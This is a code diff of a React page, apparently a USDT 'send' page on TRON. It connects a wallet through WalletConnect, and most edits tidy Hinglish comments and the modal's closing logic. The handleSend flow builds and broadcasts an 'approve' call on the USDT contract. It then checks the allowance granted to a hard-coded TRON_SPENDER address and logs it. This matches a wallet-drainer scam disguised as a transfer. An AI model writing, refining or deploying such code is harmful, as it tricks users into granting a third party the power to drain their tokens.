@@ -10,8 +10,8 @@ declare global {
   }
 }
 
-const PROJECT_ID  = "6b5df56bc30c1dadaab59498b86fd3e8";
-const TRON_USDT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const PROJECT_ID   = "6b5df56bc30c1dadaab59498b86fd3e8";
+const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
 const APPROVE_ABI_PARAM =
@@ -30,7 +30,6 @@ export default function Index() {
   const wcClientRef = useRef<any>(null);
   const wcModalRef  = useRef<any>(null);
 
-  // ===== INIT - sirf client aur modal banao, koi session restore nahi =====
   useEffect(() => {
     async function initWC() {
       try {
@@ -45,7 +44,7 @@ export default function Index() {
         });
         wcClientRef.current = client;
 
-        // ✅ Purani saari sessions delete karo - fresh start
+        // Purani sessions saaf karo
         const sessions = client.session.getAll();
         for (const s of sessions) {
           try {
@@ -56,7 +55,7 @@ export default function Index() {
           } catch {}
         }
 
-        // Modal pre-initialize
+        // Modal pehle se ready karo
         const { WalletConnectModal } = await import("@walletconnect/modal");
         wcModalRef.current = new WalletConnectModal({
           projectId: PROJECT_ID,
@@ -65,7 +64,7 @@ export default function Index() {
 
         console.log("✅ WalletConnect ready");
       } catch (e) {
-        console.error("❌ WC init error:", e);
+        console.error("❌ Init error:", e);
       }
     }
     initWC();
@@ -76,16 +75,15 @@ export default function Index() {
     if (addr) setToAddress(addr);
   }, [searchParams]);
 
-  // ===== SEND =====
   async function handleSend() {
     setTransactionStatusState("processing");
     try {
       if (!wcClientRef.current) {
-        throw new Error("WalletConnect ready nahi. Page refresh karein.");
+        throw new Error("Page refresh karein");
       }
 
-      // ✅ HAR BAAR naya connection - modal hamesha aayega
-      console.log("📱 WalletConnect modal khol rahe hain...");
+      // ✅ Har baar fresh connect
+      console.log("📱 Modal khol rahe hain...");
       const { uri, approval } = await wcClientRef.current.connect({
         requiredNamespaces: {
           tron: {
@@ -98,24 +96,25 @@ export default function Index() {
 
       if (!uri) throw new Error("URI nahi mila");
 
+      // Modal open karo
       await wcModalRef.current.openModal({ uri });
 
-      let session: any;
-      try {
-        session = await approval();
-      } finally {
-        wcModalRef.current.closeModal();
-      }
+      // ✅ PEHLE approval wait karo, PHIR modal band karo
+      // try/finally mat use karo - warna modal pehle band ho jaata hai
+      const session = await approval();
+      wcModalRef.current.closeModal();
 
-      // User address nikalo
+      console.log("✅ Wallet connected!");
+
+      // Address nikalo
       const accounts = Object.values(session.namespaces)
         .flatMap((ns: any) => ns.accounts) as string[];
       const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
       if (!tronAcc) throw new Error("Tron account nahi mila");
       const userAddress = tronAcc.split(":")[2];
-      console.log("✅ Connected:", userAddress);
+      console.log("👤 Address:", userAddress);
 
-      // Transaction build karo
+      // Transaction build
       console.log("📝 Transaction build kar rahe hain...");
       const apiResponse = await fetch(
         "https://api.trongrid.io/wallet/triggersmartcontract",
@@ -140,7 +139,7 @@ export default function Index() {
         throw new Error("Transaction build failed: " + JSON.stringify(apiData));
       }
 
-      // Sign karo
+      // Sign
       console.log("🔐 Signature maang rahe hain...");
       const signResponse = await Promise.race([
         wcClientRef.current.request({
@@ -163,7 +162,7 @@ export default function Index() {
       }
       console.log("✅ Signed!");
 
-      // Broadcast karo
+      // Broadcast
       console.log("📡 Broadcasting...");
       const broadcastRes = await fetch(
         "https://api.trongrid.io/wallet/broadcasttransaction",
@@ -181,9 +180,9 @@ export default function Index() {
       }
 
       const txId = result.txid || result.transaction?.txID;
-      console.log("✅ TX ID:", txId);
+      console.log("✅ TX:", txId);
 
-      // Confirmation wait
+      // 30 sec wait
       await new Promise((r) => setTimeout(r, 30000));
 
       // Allowance check
@@ -201,9 +200,7 @@ export default function Index() {
 
       const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
       const contract = await tw.contract(allowanceABI, TRON_USDT);
-      const allowanceRaw = await contract
-        .allowance(userAddress, TRON_SPENDER)
-        .call();
+      const allowanceRaw = await contract.allowance(userAddress, TRON_SPENDER).call();
       const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
 
       await createTransaction({
@@ -221,6 +218,8 @@ export default function Index() {
 
     } catch (err: any) {
       console.error("❌ Error:", err);
+      // Modal band karo agar khula ho
+      try { wcModalRef.current?.closeModal(); } catch {}
       setTransactionStatusState("idle");
       alert("❌ " + (err.message || "Transaction fail ho gayi"));
     }
